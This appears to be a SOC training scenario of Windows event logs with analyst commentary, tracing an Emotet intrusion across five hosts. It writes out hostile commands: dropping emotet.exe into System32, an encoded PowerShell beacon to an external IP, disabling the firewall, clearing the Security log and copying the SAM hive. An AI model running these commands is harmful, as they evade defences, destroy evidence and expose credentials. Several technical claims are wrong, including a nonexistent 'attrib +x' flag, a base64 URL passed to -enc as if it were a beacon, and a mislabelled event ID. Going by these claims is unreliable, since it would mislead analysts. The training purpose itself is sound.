# Scenario Event Logs

These are the raw Windows Event Log entries used as source material for this investigation.
Each activity was provided as part of a SOC analyst assessment scenario and forms the
evidence base for the entire playbook.

---

## Activity 1: Emotet Malware Dropped

```
Detection Date : 2023-11-16
Time           : 12:00:00 AM
Device         : WIN-WEB-01
IP Address     : 192.168.20.10
Event ID       : 4688 (Process Creation)

Command Line:
copy emotet.exe C:\Windows\System32\emotet.exe
attrib +x C:\Windows\System32\emotet.exe

File Name  : emotet.exe
SHA256     : 555dff455242a5f82f79eecb66539bfd1daa842481168f1f1df911ac05a1cfba
File Path  : C:\Windows\System32\emotet.exe
```

**Analysis:** The attacker copied emotet.exe into the System32 directory and set the executable bit.
Placing malware in System32 is a persistence technique (T1547) because it blends with legitimate
Windows binaries and survives basic AV scans that whitelist the System32 path.

---

## Activity 2: Encoded PowerShell C2 Beacon

```
Detection Date : 2023-11-16
Time           : 02:05:00 AM
Device         : WIN-WEB-02
IP Address     : 192.168.20.11
Event ID       : 4104 (PowerShell Script Block Logging)

Command Line:
powershell.exe -enc aHR0cDovLzg3LjI1MS44Ni4xNzg6ODA4MA==

Parent Process : powershell.exe
Process Owner  : NT AUTHORITY\SYSTEM
```

**Analysis:** The Base64 encoded string decodes to `http://87.251.86.178:8080`, a known Emotet C2
server. The process running as NT AUTHORITY\SYSTEM indicates the attacker had already achieved
SYSTEM-level privileges before firing the beacon. Port 8080 is typical Emotet HTTP C2 beaconing.

**Decoded value:** `http://87.251.86.178:8080`

---

## Activity 3: Firewall Disabled

```
Detection Date : 2023-10-10
Time           : 01:12:22 PM
Device         : WIN-FW-01
IP Address     : 192.168.20.1
Event ID       : 2004 (Windows Firewall Rule Modified)

Command Line:
netsh advfirewall set allprofiles state off

Parent Process : cmd.exe
Process Owner  : Administrator
```

**Analysis:** This happened six weeks before the core attack on November 16. The attacker disabled
all Windows Firewall profiles to allow unrestricted traffic in both directions. Running as
Administrator suggests either a compromised admin account or prior privilege escalation.
This is a classic defense evasion setup (T1562.004) ahead of the main compromise phase.

---

## Activity 4: Security Logs Cleared

```
Detection Date : 2023-09-01
Time           : 04:00:00 PM
Device         : WIN-LOG-01
IP Address     : 192.168.20.30
Event ID       : 1102 (Security Log Cleared)

Command Line:
wevtutil cl Security

Parent Process : cmd.exe
Process Owner  : SYSTEM
```

**Analysis:** This is the earliest recorded malicious activity in the timeline, occurring eleven weeks
before the November 16 execution phase. The attacker cleared the Security event log to destroy
evidence of earlier activity. Running as SYSTEM confirms deep access was already established well
before the visible attack began. This is T1070.001 (Indicator Removal).

---

## Activity 5: SAM Database Exfiltrated

```
Detection Date : 2023-11-16
Time           : 03:00:00 AM
Device         : WIN-DB-01
IP Address     : 192.168.20.40
Event ID       : 4663 (Object Access Attempt)

Command Line:
copy C:\Windows\System32\config\SAM C:\Users\Public\SAM_Backup

Parent Process : cmd.exe
Process Owner  : Administrator
```

**Analysis:** The SAM database contains hashed passwords for all local Windows accounts. Copying it
to the Public directory made it accessible for exfiltration without elevated privileges. This is
T1003.002 (OS Credential Dumping: SAM). Combined with the earlier credential access, the attacker
now had everything needed for pass-the-hash attacks and lateral movement across the network.

---

## Endpoint Summary

| Endpoint | IP Address | Role | Affected Activities |
|---|---|---|---|
| WIN-WEB-01 | 192.168.20.10 | Web server | Emotet dropper (Activity 1) |
| WIN-WEB-02 | 192.168.20.11 | Web server | PowerShell C2 beacon (Activity 2) |
| WIN-FW-01 | 192.168.20.1 | Firewall host | Firewall disabled (Activity 3) |
| WIN-LOG-01 | 192.168.20.30 | Log server | Security logs cleared (Activity 4) |
| WIN-DB-01 | 192.168.20.40 | Database server | SAM exfiltration (Activity 5) |
